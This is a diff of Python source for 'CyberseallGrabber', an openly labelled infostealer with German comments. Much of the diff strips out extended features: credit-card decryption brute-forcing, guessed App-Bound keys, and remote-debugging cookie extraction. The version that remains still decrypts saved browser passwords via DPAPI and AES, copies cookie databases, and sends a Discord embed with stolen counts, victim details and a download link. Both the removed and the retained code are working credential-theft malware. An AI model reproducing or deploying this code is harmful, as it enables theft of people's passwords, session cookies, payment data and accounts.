                 for edge_base in edge_paths:
                     if os.path.exists(edge_base):
-                        # Erweiterte Profil-Suche für Edge
-                        for profile in ["Default", "Profile 1", "Profile 2", "Profile 3", "Profile 4", "Profile 5", "Profile 6", "Profile 7", "Profile 8", "Profile 9", "Profile 10"]:
+                        for profile in ["Default", "Profile 1"]:
                             profile_path = os.path.join(edge_base, profile)
                             if os.path.exists(profile_path):
                                 simple_browsers.append({
@@ -801,29 +322,11 @@ class CyberseallGrabber:
                                     "base_path": edge_base,
                                     "login_file": "Login Data"
                                 })
-                        
-                        # Automatische Erkennung aller Edge-Profile
-                        try:
-                            for item in os.listdir(edge_base):
-                                item_path = os.path.join(edge_base, item)
-                                if os.path.isdir(item_path) and (item.startswith('Profile') or item == 'Default'):
-                                    # Prüfe ob bereits hinzugefügt
-                                    already_added = any(browser["name"] == f"Edge-{item}" for browser in simple_browsers)
-                                    if not already_added:
-                                        simple_browsers.append({
-                                            "name": f"Edge-{item}",
-                                            "path": item_path,
-                                            "base_path": edge_base,
-                                            "login_file": "Login Data"
-                                        })
-                        except:
-                            pass
                 
 
                 brave_base = os.path.join(os.getenv("LOCALAPPDATA"), "BraveSoftware", "Brave-Browser", "User Data")
                 if os.path.exists(brave_base):
-                    # Erweiterte Profil-Suche für Brave
-                    for profile in ["Default", "Profile 1", "Profile 2", "Profile 3", "Profile 4", "Profile 5", "Profile 6", "Profile 7", "Profile 8", "Profile 9", "Profile 10"]:
+                    for profile in ["Default", "Profile 1"]:
                         profile_path = os.path.join(brave_base, profile)
                         if os.path.exists(profile_path):
                             simple_browsers.append({
@@ -832,23 +335,6 @@ class CyberseallGrabber:
                                 "base_path": brave_base,
                                 "login_file": "Login Data"
                             })
-                    
-                    # Automatische Erkennung aller Brave-Profile
-                    try:
-                        for item in os.listdir(brave_base):
-                            item_path = os.path.join(brave_base, item)
-                            if os.path.isdir(item_path) and (item.startswith('Profile') or item == 'Default'):
-                                # Prüfe ob bereits hinzugefügt
-                                already_added = any(browser["name"] == f"Brave-{item}" for browser in simple_browsers)
-                                if not already_added:
-                                    simple_browsers.append({
-                                        "name": f"Brave-{item}",
-                                        "path": item_path,
-                                        "base_path": brave_base,
-                                        "login_file": "Login Data"
-                                    })
-                    except:
-                        pass
                 
 
                 opera_base = os.path.join(os.getenv("APPDATA"), "Opera Software", "Opera Stable")
@@ -886,53 +372,9 @@ class CyberseallGrabber:
                         try:
                             with open(state_file, "r", encoding="utf-8") as f:
                                 local_state = json.loads(f.read())
-                                
-                                # Versuche zuerst App-Bound Key für v20 (falls verfügbar)
-                                app_bound_key = None
-                                try:
-                                    if "app_bound_encrypted_key" in local_state.get("os_crypt", {}):
-                                        # App-Bound Encryption für v20 - vereinfachte Version
-                                        app_bound_encrypted_key = local_state["os_crypt"]["app_bound_encrypted_key"]
-                                        if app_bound_encrypted_key:
-                                            # Versuche bekannte App-Bound Keys
-                                            aes_key = bytes.fromhex("B31C6E241AC846728DA9C1FAC4936651CFFB944D143AB816276BCC6DA0284787")
-                                            chacha20_key = bytes.fromhex("E98F37D7F4E1FA433D19304DC2258042090E2D1D7EEA7670D41F738D08729660")
-                                            
-                                            # Versuche verschiedene Schlüssel
-                                            for test_key in [aes_key, chacha20_key]:
-                                                try:
-                                                    # Vereinfachte App-Bound Entschlüsselung
-                                                    decoded_key = base64.b64decode(app_bound_encrypted_key)
-                                                    if len(decoded_key) > 60:
-                                                        flag = decoded_key[0] if len(decoded_key) > 0 else 0
-                                                        if flag in [1, 2]:
-                                                            iv = decoded_key[1:13]
-                                                            ciphertext = decoded_key[13:45]
-                                                            tag = decoded_key[45:61]
-                                                            
-                                                            if flag == 1:
-                                                                cipher = AES.new(test_key, AES.MODE_GCM, nonce=iv)
-                                                            elif flag == 2 and ChaCha20_Poly1305:
-                                                                cipher = ChaCha20_Poly1305.new(key=test_key, nonce=iv)
-                                                            else:
-                                                                continue
-                                                            
-                                                            app_bound_key = cipher.decrypt_and_verify(ciphertext, tag)
-                                                            break
-                                                except:
-                                                    continue
-                                except:
-                                    pass
-                                
-                                # Standard Master Key Extraktion
                                 encrypted_key = local_state["os_crypt"]["encrypted_key"]
                                 master_key = base64.b64decode(encrypted_key)[5:]
                                 master_key = win32crypt.CryptUnprotectData(master_key, None, None, None, 0)[1]
-                                
-                                # Verwende App-Bound Key falls verfügbar, sonst Master Key
-                                if app_bound_key:
-                                    master_key = app_bound_key
-                                    
                         except:
                             continue
 
@@ -975,23 +417,25 @@ class CyberseallGrabber:
                                             pass
                                     
 
-                                    # Nur vollständig entschlüsselte und saubere Passwörter hinzufügen
-                                    if (decrypted_password and 
-                                        decrypted_password != "Failed to decrypt" and
-                                        not decrypted_password.startswith("Partial:") and
-                                        len(decrypted_password) >= 3):
-                                        
-                                        # Prüfe auf korrupte Zeichen
-                                        clean_password = ''.join(c for c in decrypted_password if 32 <= ord(c) <= 126)
-                                        if len(clean_password) >= 3 and len(clean_password) == len(decrypted_password):
-                                            passwords.append({
-                                                "browser": browser_name,
-                                                "url": url,
-                                                "username": username,
-                                                "password": decrypted_password,
-                                                "times_used": 0,
-                                                "date_created": 0
-                                            })
+                                    if not decrypted_password or decrypted_password == "Failed to decrypt":
+                                        try:
+                                            if isinstance(encrypted_password, bytes) and len(encrypted_password) > 10:
+                                                readable = ''.join(chr(c) for c in encrypted_password if 32 <= c <= 126)
+                                                if len(readable) > 3:
+                                                    decrypted_password = f"Partial: {readable[:30]}"
+                                        except:
+                                            pass
+                                    
+
+                                    if decrypted_password and decrypted_password != "Failed to decrypt":
+                                        passwords.append({
+                                            "browser": browser_name,
+                                            "url": url,
+                                            "username": username,
+                                            "password": decrypted_password,
+                                            "times_used": 0,
+                                            "date_created": 0
+                                        })
 
                             cursor.close()
                             conn.close()
@@ -1079,12 +523,7 @@ class CyberseallGrabber:
                                         if cookie[2]:
                                             try:
                                                 decrypted_value = decrypt_password(cookie[2], master_key)
-                                                # Nur vollständig entschlüsselte Cookie-Werte speichern
-                                                if (decrypted_value and 
-                                                    decrypted_value != "Failed to decrypt" and 
-                                                    not decrypted_value.startswith("Partial:") and
-                                                    len(decrypted_value) > 5 and
-                                                    not any(char in decrypted_value for char in ['�', '\x00', '\ufffd', 'v20'])):
+                                                if decrypted_value and decrypted_value != "Failed to decrypt" and len(decrypted_value) > 5:
                                                     valuable_cookies.append({
                                                         "browser": f"{browser_name}-{profile}",
                                                         "url": f"COOKIE_{domain}",
@@ -1121,21 +560,13 @@ class CyberseallGrabber:
 
             pw_data = []
             for pwd in all_data:
-                # Nur vollständig entschlüsselte Passwörter verarbeiten
-                password = pwd.get('password', '')
-                if (password and 
-                    password != "Failed to decrypt" and 
-                    not password.startswith("Partial:") and
-                    len(password) > 3 and
-                    not any(char in password for char in ['�', '\x00', '\ufffd', 'v20'])):
-                    
-                    if pwd.get('times_used', 0) > 0:
-                        usage_info = f" | Used: {pwd['times_used']}x"
-                    else:
-                        usage_info = ""
-                    
-                    password_entry = f"{pwd['browser']} | {pwd['url']} | {pwd['username']} | {password}{usage_info}"
-                    pw_data.append(password_entry)
+                if pwd.get('times_used', 0) > 0:
+                    usage_info = f" | Used: {pwd['times_used']}x"
+                else:
+                    usage_info = ""
+                
+                password_entry = f"{pwd['browser']} | {pwd['url']} | {pwd['username']} | {pwd['password']}{usage_info}"
+                pw_data.append(password_entry)
             
 
             self.p = pw_data
@@ -1280,87 +711,17 @@ class CyberseallGrabber:
             autofill_data = []
             
 
-            browsers = {}
-            
-            # Chrome Varianten (erweitert)
-            chrome_base = os.path.join(os.getenv("LOCALAPPDATA"), "Google", "Chrome", "User Data")
-            if os.path.exists(chrome_base):
-                for profile in ["Default", "Profile 1", "Profile 2", "Profile 3", "Profile 4", "Profile 5", "Profile 6", "Profile 7", "Profile 8", "Profile 9", "Profile 10"]:
-                    profile_path = os.path.join(chrome_base, profile, "Web Data")
-                    if os.path.exists(profile_path):
-                        browsers[f'Chrome-{profile}'] = profile_path
-                
-                # Automatische Erkennung aller Chrome-Profile
-                try:
-                    for item in os.listdir(chrome_base):
-                        item_path = os.path.join(chrome_base, item)
-                        if os.path.isdir(item_path) and (item.startswith('Profile') or item == 'Default'):
-                            webdata_path = os.path.join(item_path, "Web Data")
-                            if os.path.exists(webdata_path) and f'Chrome-{item}' not in browsers:
-                                browsers[f'Chrome-{item}'] = webdata_path
-                except:
-                    pass
-            
-            # Edge Varianten (erweitert)
-            edge_base = os.path.join(os.getenv("LOCALAPPDATA"), "Microsoft", "Edge", "User Data")
-            if os.path.exists(edge_base):
-                for profile in ["Default", "Profile 1", "Profile 2", "Profile 3", "Profile 4", "Profile 5", "Profile 6", "Profile 7", "Profile 8", "Profile 9", "Profile 10"]:
-                    profile_path = os.path.join(edge_base, profile, "Web Data")
-                    if os.path.exists(profile_path):
-                        browsers[f'Edge-{profile}'] = profile_path
-                
-                # Automatische Erkennung aller Edge-Profile
-                try:
-                    for item in os.listdir(edge_base):
-                        item_path = os.path.join(edge_base, item)
-                        if os.path.isdir(item_path) and (item.startswith('Profile') or item == 'Default'):
-                            webdata_path = os.path.join(item_path, "Web Data")
-                            if os.path.exists(webdata_path) and f'Edge-{item}' not in browsers:
-                                browsers[f'Edge-{item}'] = webdata_path
-                except:
-                    pass
-            
-            # Brave (erweitert)
-            brave_base = os.path.join(os.getenv("LOCALAPPDATA"), "BraveSoftware", "Brave-Browser", "User Data")
-            if os.path.exists(brave_base):
-                for profile in ["Default", "Profile 1", "Profile 2", "Profile 3", "Profile 4", "Profile 5", "Profile 6", "Profile 7", "Profile 8", "Profile 9", "Profile 10"]:
-                    profile_path = os.path.join(brave_base, profile, "Web Data")
-                    if os.path.exists(profile_path):
-                        browsers[f'Brave-{profile}'] = profile_path
-                
-                # Automatische Erkennung aller Brave-Profile
-                try:
-                    for item in os.listdir(brave_base):
-                        item_path = os.path.join(brave_base, item)
-                        if os.path.isdir(item_path) and (item.startswith('Profile') or item == 'Default'):
-                            webdata_path = os.path.join(item_path, "Web Data")
-                            if os.path.exists(webdata_path) and f'Brave-{item}' not in browsers:
-                                browsers[f'Brave-{item}'] = webdata_path
-                except:
-                    pass
-            
-            # Opera
-            opera_path = os.path.join(os.getenv("APPDATA"), "Opera Software", "Opera Stable", "Web Data")
-            if os.path.exists(opera_path):
-                browsers['Opera'] = opera_path
+            browsers = {
+                'Chrome': os.path.join(os.getenv("LOCALAPPDATA"), "Google", "Chrome", "User Data", "Default", "Web Data"),
+                'Chrome-Profile1': os.path.join(os.getenv("LOCALAPPDATA"), "Google", "Chrome", "User Data", "Profile 1", "Web Data"),
+                'Edge': os.path.join(os.getenv("LOCALAPPDATA"), "Microsoft", "Edge", "User Data", "Default", "Web Data"),
+                'Brave': os.path.join(os.getenv("LOCALAPPDATA"), "BraveSoftware", "Brave-Browser", "User Data", "Default", "Web Data"),
+                'Opera': os.path.join(os.getenv("APPDATA"), "Opera Software", "Opera Stable", "Web Data")
+            }
             
             for browser_name, webdata_path in browsers.items():
                 if os.path.exists(webdata_path):
                     try:
-                        # Hole den Verschlüsselungsschlüssel
-                        browser_base = os.path.dirname(os.path.dirname(webdata_path))
-                        local_state_path = os.path.join(browser_base, "Local State")
-                        
-                        master_key = None
-                        if os.path.exists(local_state_path):
-                            try:
-                                with open(local_state_path, "r", encoding="utf-8") as f:
-                                    local_state = json.loads(f.read())
-                                    encrypted_key = local_state["os_crypt"]["encrypted_key"]
-                                    master_key = base64.b64decode(encrypted_key)[5:]
-                                    master_key = win32crypt.CryptUnprotectData(master_key, None, None, None, 0)[1]
-                            except:
-                                pass
 
                         temp_webdata_db = os.path.join(os.getenv("TEMP"), f"{browser_name}_webdata.db")
                         if os.path.exists(temp_webdata_db):
@@ -1402,75 +763,7 @@ class CyberseallGrabber:
                             
                             for card in cards:
                                 if card[1] or card[4]:
-                                    card_number = "[ENCRYPTED]"
-                                    if master_key and card[4]:
-                                        try:
-                                            # ULTIMATE KREDITKARTEN-ENTSCHLÜSSELUNG
-                                            decrypted_number = None
-                                            
-                                            # METHODE 1: Standard AES-GCM
-                                            try:
-                                                if card[4][:3] == b'v10' or card[4][:3] == b'v11':
-                                                    iv = card[4][3:15]
-                                                    encrypted_data = card[4][15:]
-                                                    cipher = AES.new(master_key, AES.MODE_GCM, iv)
-                                                    decrypted_number = cipher.decrypt(encrypted_data[:-16]).decode('utf-8')
-                                            except:
-                                                pass
-                                            
-                                            # METHODE 2: DPAPI Entschlüsselung
-                                            if not decrypted_number:
-                                                try:
-                                                    result = win32crypt.CryptUnprotectData(card[4], None, None, None, 0)
-                                                    if result and result[1]:
-                                                        decrypted_number = result[1].decode('utf-8', errors='ignore') if isinstance(result[1], bytes) else str(result[1])
-                                                except:
-                                                    pass
-                                            
-                                            # METHODE 3: Verschiedene IV-Positionen
-                                            if not decrypted_number:
-                                                try:
-                                                    for iv_start in [0, 3, 12]:
-                                                        for iv_len in [12, 16]:
-                                                            if len(card[4]) >= iv_start + iv_len + 16:
-                                                                iv = card[4][iv_start:iv_start + iv_len]
-                                                                encrypted_data = card[4][iv_start + iv_len:]
-                                                                cipher = AES.new(master_key, AES.MODE_GCM, iv)
-                                                                decrypted_number = cipher.decrypt(encrypted_data[:-16]).decode('utf-8', errors='ignore')
-                                                                if decrypted_number and len(decrypted_number) >= 12:
-                                                                    break
-                                                        if decrypted_number and len(decrypted_number) >= 12:
-                                                            break
-                                                except:
-                                                    pass
-                                            
-                                            # METHODE 4: Partial Recovery für Kreditkarten
-                                            if not decrypted_number:
-                                                try:
-                                                    if isinstance(card[4], bytes) and len(card[4]) > 10:
-                                                        # Suche nach Kreditkartennummern-Mustern
-                                                        for start in range(0, min(len(card[4]), 20)):
-                                                            for end in range(start + 12, len(card[4]) + 1):
-                                                                chunk = card[4][start:end]
-                                                                # Extrahiere nur Zahlen
-                                                                numbers = ''.join(chr(c) for c in chunk if 48 <= c <= 57)
-                                                                if len(numbers) >= 12 and len(numbers) <= 19:
-                                                                    # Prüfe ob es eine gültige Kreditkartennummer sein könnte
-                                                                    if numbers.startswith(('4', '5', '3', '6')):  # Visa, MC, Amex, Discover
-                                                                        decrypted_number = numbers
-                                                                        break
-                                                            if decrypted_number:
-                                                                break
-                                                except:
-                                                    pass
-                                            
-                                            if decrypted_number and len(decrypted_number) >= 12:
-                                                # Maskiere die Nummer (zeige nur letzte 4 Ziffern)
-                                                card_number = f"****-****-****-{decrypted_number[-4:]}"
-                                        except:
-                                            pass
-                                    
-                                    card_info = f"CREDIT_CARD_{browser_name} | Name: {card[1] or 'N/A'} | Expires: {card[2] or 'N/A'}/{card[3] or 'N/A'} | Number: {card_number} | Modified: {card[5] or 'N/A'}"
+                                    card_info = f"CREDIT_CARD_{browser_name} | Name: {card[1] or 'N/A'} | Expires: {card[2] or 'N/A'}/{card[3] or 'N/A'} | Number: [ENCRYPTED] | Modified: {card[5] or 'N/A'}"
                                     autofill_data.append(card_info)
                         except:
                             pass
@@ -1522,201 +815,45 @@ class CyberseallGrabber:
             pass
 
     def cookies(self):
-        """
-        ULTIMATE COOKIE EXTRACTOR - Chrome Remote Debugging Protocol
-        Bypass v20 App-Bound Encryption ohne Admin-Rechte
-        """
         try:
             cookies_data = []
-            
-            # Browser-Konfiguration für Remote Debugging
-            DEBUG_PORT = 9222
-            LOCAL_APP_DATA = os.getenv('LOCALAPPDATA')
-            APP_DATA = os.getenv('APPDATA')
-            PROGRAM_FILES = os.getenv('PROGRAMFILES')
-            PROGRAM_FILES_X86 = os.getenv('PROGRAMFILES(X86)')
-            
-            browsers_config = {
-                'Chrome': {
-                    'bin': rf"{PROGRAM_FILES}\Google\Chrome\Application\chrome.exe",
-                    'user_data': rf'{LOCAL_APP_DATA}\Google\Chrome\User Data',
-                    'profiles': ["Default", "Profile 1", "Profile 2", "Profile 3", "Profile 4", "Profile 5"]
-                },
-                'Edge': {
-                    'bin': rf"{PROGRAM_FILES_X86}\Microsoft\Edge\Application\msedge.exe",
-                    'user_data': rf'{LOCAL_APP_DATA}\Microsoft\Edge\User Data',
-                    'profiles': ["Default", "Profile 1", "Profile 2", "Profile 3"]
-                },
-                'Brave': {
-                    'bin': rf"{PROGRAM_FILES}\BraveSoftware\Brave-Browser\Application\brave.exe",
-                    'user_data': rf'{LOCAL_APP_DATA}\BraveSoftware\Brave-Browser\User Data',
-                    'profiles': ["Default", "Profile 1", "Profile 2"]
-                }
+            browsers = {
+                'Chrome': os.path.join(os.getenv("LOCALAPPDATA"), "Google", "Chrome", "User Data", "Default", "Network", "Cookies"),
+                'Edge': os.path.join(os.getenv("LOCALAPPDATA"), "Microsoft", "Edge", "User Data", "Default", "Network", "Cookies"),
+                'Brave': os.path.join(os.getenv("LOCALAPPDATA"), "BraveSoftware", "Brave-Browser", "User Data", "Default", "Network", "Cookies")
             }
             
-            def close_browser(bin_path):
-                """Browser-Prozesse beenden"""
-                try:
-                    import pathlib
-                    proc_name = pathlib.Path(bin_path).name
-                    subprocess.run(f'taskkill /F /IM {proc_name}', check=False, shell=False, 
-                                 stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL)
-                except:
-                    pass
-            
-            def start_browser_debug(bin_path, user_data_path, profile=None):
-                """Browser mit Remote Debugging starten"""
-                try:
-                    args = [
-                        bin_path,
-                        '--restore-last-session',
-                        f'--remote-debugging-port={DEBUG_PORT}',
-                        '--remote-allow-origins=*',
-                        '--headless',
-                        f'--user-data-dir={user_data_path}'
-                    ]
-                    
-                    if profile and profile != "Default":
-                        args.append(f'--profile-directory={profile}')
-                    
-                    return subprocess.Popen(args, stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL)
-                except:
-                    return None
-            
-            def get_debug_ws_url():
-                """WebSocket Debug URL abrufen"""
-                try:
-                    import time
-                    time.sleep(2)  # Warte bis Browser gestartet ist
-                    response = requests.get(f'http://localhost:{DEBUG_PORT}/json', timeout=5)
-                    data = response.json()
-                    return data[0]['webSocketDebuggerUrl'].strip()
-                except:
-                    return None
-            
-            def get_all_cookies_debug(ws_url):
-                """Alle Cookies über WebSocket Debug Protocol abrufen"""
-                try:
-                    import websocket
-                    ws = websocket.create_connection(ws_url, timeout=10)
-                    ws.send(json.dumps({'id': 1, 'method': 'Network.getAllCookies'}))
-                    response = ws.recv()
-                    response_data = json.loads(response)
-                    cookies = response_data.get('result', {}).get('cookies', [])
-                    ws.close()
-                    return cookies
-                except:
-                    return []
-            
-            # Extrahiere Cookies von allen Browsern
-            for browser_name, config in browsers_config.items():
-                if not os.path.exists(config['bin']):
-                    continue
-                
-                # Für jeden Browser alle Profile durchgehen
-                for profile in config['profiles']:
-                    profile_path = os.path.join(config['user_data'], profile)
-                    if not os.path.exists(profile_path):
-                        continue
-                    
+            for browser_name, cookies_path in browsers.items():
+                if os.path.exists(cookies_path):
                     try:
-                        # Browser schließen falls läuft
-                        close_browser(config['bin'])
-                        
-                        # Browser mit Debug-Modus starten
-                        browser_process = start_browser_debug(config['bin'], config['user_data'], profile)
-                        if not browser_process:
-                            continue
-                        
-                        # WebSocket URL abrufen
-                        ws_url = get_debug_ws_url()
-                        if not ws_url:
-                            browser_process.terminate()
-                            continue
-                        
-                        # Cookies über Debug Protocol abrufen
-                        debug_cookies = get_all_cookies_debug(ws_url)
-                        
-                        # Browser beenden
-                        browser_process.terminate()
-                        close_browser(config['bin'])
-                        
-                        # Cookies verarbeiten
-                        for cookie in debug_cookies:
-                            try:
-                                cookie_info = {
-                                    'browser': f"{browser_name}-{profile}",
-                                    'host': cookie.get('domain', ''),
-                                    'name': cookie.get('name', ''),
-                                    'path': cookie.get('path', '/'),
-                                    'value': cookie.get('value', '')[:100] + "..." if len(cookie.get('value', '')) > 100 else cookie.get('value', ''),
-                                    'expires': cookie.get('expires', 0),
-                                    'secure': cookie.get('secure', False),
-                                    'httponly': cookie.get('httpOnly', False),
-                                    'samesite': cookie.get('sameSite', ''),
-                                    'size': cookie.get('size', 0)
-                                }
-                                cookies_data.append(cookie_info)
-                            except:
-                                continue
-                        
-                        # Kurze Pause zwischen Profilen
-                        import time
-                        time.sleep(1)
-                        
-                    except Exception as e:
+                        temp_cookies_db = os.path.join(os.getenv("TEMP"), f"{browser_name}_cookies.db")
+                        if os.path.exists(temp_cookies_db):
+                            os.remove(temp_cookies_db)
+                        shutil.copy2(cookies_path, temp_cookies_db)
+                        conn = sqlite3.connect(temp_cookies_db)
+                        cursor = conn.cursor()
+                        cursor.execute("SELECT host_key, name, value FROM cookies LIMIT 50")
+                        for row in cursor.fetchall():
+                            if row[0] and row[1] and row[2]:
+                                cookies_data.append(f"COOKIE_{browser_name} | {row[0]} | {row[1]} | {row[2][:50]}")
+                        cursor.close()
+                        conn.close()
                         try:
-                            if 'browser_process' in locals():
-                                browser_process.terminate()
-                            close_browser(config['bin'])
+                            os.remove(temp_cookies_db)
                         except:
                             pass
-                        continue
+                    except:
+                        pass
             
             self.co = cookies_data
-            
-            # Cookies in Dateien speichern
             if cookies_data:
                 try:
-                    # JSON Format für strukturierte Daten
-                    with open(os.path.join(self.d, "cookies.json"), "w", encoding="utf-8") as f:
-                        json.dump(cookies_data, f, indent=2, ensure_ascii=False)
-                    
-                    # TXT Format für einfache Lesbarkeit
                     with open(os.path.join(self.d, "cookies.txt"), "w", encoding="utf-8") as f:
-                        f.write("BROWSER COOKIES EXTRACTOR (Remote Debug Protocol)\n")
-                        f.write("=" * 60 + "\n\n")
-                        
-                        # Gruppiere nach Browser
-                        browsers_found = {}
+                        f.write("BROWSER COOKIES\n")
+                        f.write("=" * 50 + "\n\n")
                         for cookie in cookies_data:
-                            browser = cookie['browser']
-                            if browser not in browsers_found:
-                                browsers_found[browser] = []
-                            browsers_found[browser].append(cookie)
-                        
-                        for browser, browser_cookies in browsers_found.items():
-                            f.write(f"{browser.upper()} ({len(browser_cookies)} cookies)\n")
-                            f.write("-" * 50 + "\n")
-                            
-                            for cookie in browser_cookies[:25]:  # Zeige 25 pro Browser
-                                f.write(f"Host: {cookie['host']}\n")
-                                f.write(f"Name: {cookie['name']}\n")
-                                f.write(f"Value: {cookie['value']}\n")
-                                f.write(f"Path: {cookie['path']}\n")
-                                f.write(f"Secure: {cookie['secure']} | HttpOnly: {cookie['httponly']}\n")
-                                f.write(f"SameSite: {cookie.get('samesite', 'None')} | Size: {cookie.get('size', 0)} bytes\n")
-                                f.write("-" * 30 + "\n")
-                            
-                            if len(browser_cookies) > 25:
-                                f.write(f"... and {len(browser_cookies) - 25} more cookies\n")
-                            f.write("\n")
-                        
-                        f.write("=" * 60 + "\n")
-                        f.write(f"TOTAL COOKIES EXTRACTED: {len(cookies_data)}\n")
-                        f.write("Extraction Method: Chrome Remote Debugging Protocol\n")
-                        f.write("Bypasses v20 App-Bound Encryption without Admin rights\n")
-                        f.write("=" * 60 + "\n")
+                            f.write(cookie + "\n")
+                        f.write(f"\nTotal Cookies: {len(cookies_data)}\n")
                 except:
                     pass
         except:
@@ -2304,26 +1441,21 @@ module.exports = require('./core.asar');
                 
 
                 with open(os.path.join(self.d, "GRABBER_STATISTICS.txt"), "w", encoding="utf-8") as f:
-                    f.write("CYBERSEALL ULTIMATE GRABBER v6.1\n")
+                    f.write("CYBERSEALL ULTIMATE GRABBER v6.0\n")
                     f.write("=" * 60 + "\n\n")
-                    f.write("📊 FINAL STATISTICS:\n")
-                    f.write("-" * 30 + "\n")
-                    f.write(f"🔐 Browser Passwords: {len(self.p)}\n")
-                    f.write(f"📜 Browser History: {len(self.h)}\n")
-                    f.write(f"📝 Autofill Data: {len(self.af)}\n")
-                    f.write(f"🍪 Browser Cookies: {len(self.co)}\n")
-                    f.write(f"🎫 Raw Tokens: {len(set(self.t))}\n")
-                    f.write(f"✅ Valid Tokens: {len(self.vt)}\n")
-                    f.write(f"📁 Keyword Files: {len(self.f)}\n")
-                    f.write(f"🔒 VPN Configurations: {len(self.v)}\n")
-                    f.write(f"🎮 Gaming Accounts: {len(self.ga)}\n")
-                    f.write(f"💉 Discord Injections: {len(self.di)}\n\n")
-                    f.write("🎯 TARGET INFORMATION:\n")
-                    f.write("-" * 30 + "\n")
-                    f.write(f"👤 User: {getpass.getuser()}\n")
-                    f.write(f"💻 Computer: {os.getenv('COMPUTERNAME', 'Unknown')}\n")
-                    f.write(f"🖥️ Platform: {platform.platform()}\n")
-                    f.write(f"⏰ Timestamp: {time.strftime('%Y-%m-%d %H:%M:%S')}\n")
+                    f.write("FINAL STATISTICS:\n")
+                    f.write(f"Browser Passwords: {len(self.p)}\n")
+                    f.write(f"Browser History: {len(self.h)}\n")
+                    f.write(f"Autofill Data: {len(self.af)}\n")
+                    f.write(f"Raw Tokens: {len(set(self.t))}\n")
+                    f.write(f"Valid Tokens: {len(self.vt)}\n")
+                    f.write(f"Keyword Files: {len(self.f)}\n")
+                    f.write(f"VPN Configurations: {len(self.v)}\n")
+                    f.write(f"Gaming Accounts: {len(self.ga)}\n")
+                    f.write(f"Discord Injections: {len(self.di)}\n\n")
+                    f.write(f"Target: {getpass.getuser()}@{os.getenv('COMPUTERNAME', 'Unknown')}\n")
+                    f.write(f"Platform: {platform.platform()}\n")
+                    f.write(f"Timestamp: {time.strftime('%Y-%m-%d %H:%M:%S')}\n")
                     f.write("=" * 60 + "\n")
             except:
                 pass
@@ -2375,13 +1507,13 @@ module.exports = require('./core.asar');
 
             embed_fields = [
                 {
-                    "name": "CYBERSEALL ULTIMATE GRABBER v6.1",
-                    "value": f"```🔐 Browser Passwords: {total_passwords}\n📜 Browser History: {total_history}\n📝 Autofill Data: {total_autofill}\n🍪 Browser Cookies: {total_cookies}\n🎫 Raw Tokens: {total_tokens}\n✅ Valid Tokens: {valid_tokens}\n📁 Keyword Files: {total_files}\n🔒 VPNs Found: {total_vpns}\n🎮 Gaming Accounts: {total_games}\n💉 Discord Injections: {total_injections}```",
+                    "name": "CYBERSEALL ULTIMATE GRABBER v6.0",
+                    "value": f"```🔐 Browser Passwords: {total_passwords}\n🍪 Browser Cookies: {total_cookies}\n📜 Browser History: {total_history}\n📝 Autofill Data: {total_autofill}\n🎫 Raw Tokens: {total_tokens}\n✅ Valid Tokens: {valid_tokens}\n📁 Keyword Files: {total_files}\n🔒 VPNs Found: {total_vpns}\n🎮 Gaming Accounts: {total_games}\n💉 Discord Injections: {total_injections}```",
                     "inline": False
                 },
                 {
-                    "name": "🎯 Target System",
-                    "value": f"```👤 User: {getpass.getuser()}\n💻 Computer: {os.getenv('COMPUTERNAME', 'Unknown')}\n🖥️ Platform: {platform.platform()}```",
+                    "name": "Target System",
+                    "value": f"```User: {getpass.getuser()}\nComputer: {os.getenv('COMPUTERNAME', 'Unknown')}\nPlatform: {platform.platform()}```",
                     "inline": False
                 }
             ]
@@ -2424,7 +1556,7 @@ module.exports = require('./core.asar');
                     browser_summary.append(f"{browser}: {count}")
                 
                 embed_fields.append({
-                    "name": "🔐 Browser Breakdown",
+                    "name": "Browser Breakdown",
                     "value": f"```{chr(10).join(browser_summary)}```",
                     "inline": False
                 })
@@ -2436,7 +1568,7 @@ module.exports = require('./core.asar');
                     vpn_summary.append(vpn_info)
                 
                 embed_fields.append({
-                    "name": "🔒 VPN Configurations",
+                    "name": "VPN Configurations",
                     "value": f"```{chr(10).join(vpn_summary)}```",
                     "inline": False
                 })
@@ -2448,44 +1580,25 @@ module.exports = require('./core.asar');
                     game_summary.append(game_info)
                 
                 embed_fields.append({
-                    "name": "🎮 Gaming Accounts",
+                    "name": "Gaming Accounts",
                     "value": f"```{chr(10).join(game_summary)}```",
-                    "inline": False
-                })
-            
-            # Cookie Summary
-            if total_cookies > 0:
-                cookie_stats = {}
-                for cookie in self.co:
-                    browser = cookie['browser']
-                    if browser not in cookie_stats:
-                        cookie_stats[browser] = 0
-                    cookie_stats[browser] += 1
-                
-                cookie_summary = []
-                for browser, count in sorted(cookie_stats.items(), key=lambda x: x[1], reverse=True)[:5]:
-                    cookie_summary.append(f"{browser}: {count}")
-                
-                embed_fields.append({
-                    "name": "🍪 Browser Cookies",
-                    "value": f"```{chr(10).join(cookie_summary)}```",
                     "inline": False
                 })
             
 
             embed_fields.append({
-                "name": "📥 Download All Data",
-                "value": f"[**🔗 CLICK HERE TO DOWNLOAD**]({self.link if hasattr(self, 'link') else 'Upload failed'})",
+                "name": "Download All Data",
+                "value": f"[**CLICK HERE TO DOWNLOAD**]({self.link if hasattr(self, 'link') else 'Upload failed'})",
                 "inline": False
             })
             
             embed = {
                 "embeds": [{
-                    "title": "CYBERSEALL ULTIMATE GRABBER v6.2",
+                    "title": "CYBERSEALL ULTIMATE GRABBER v6.0",
                     "description": "**COMPLETE DATA EXTRACTION WITH DISCORD INJECTION**",
                     "color": 0xff0000,
                     "fields": embed_fields,
-                    "footer": {"text": "Cyberseall ULTIMATE v6.2 - Browser, History, Autofill, Cookies, VPN, Gaming & Discord Stealer"},
+                    "footer": {"text": "Cyberseall ULTIMATE v6.0 - Browser, History, Autofill, VPN, Gaming & Discord Stealer"},
                     "timestamp": time.strftime('%Y-%m-%dT%H:%M:%S.000Z', time.gmtime())
                 }]
             }
